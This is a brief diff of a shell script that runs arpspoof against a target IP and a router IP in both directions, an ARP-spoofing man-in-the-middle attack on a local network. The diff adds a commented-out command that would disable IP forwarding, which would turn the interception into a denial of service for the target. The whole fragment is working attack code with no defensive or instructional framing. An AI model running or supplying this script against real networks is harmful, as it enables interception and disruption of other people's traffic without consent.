@@ -9,4 +9,6 @@ targetIP=$1
 routeIP=$2
 networkCardName=${3:-eth0}
 
+# echo 0 > /proc/sys/net/ipv4/ip_forward
+
 arpspoof -i "$networkCardName" -t "$targetIP" -r "$routeIP"
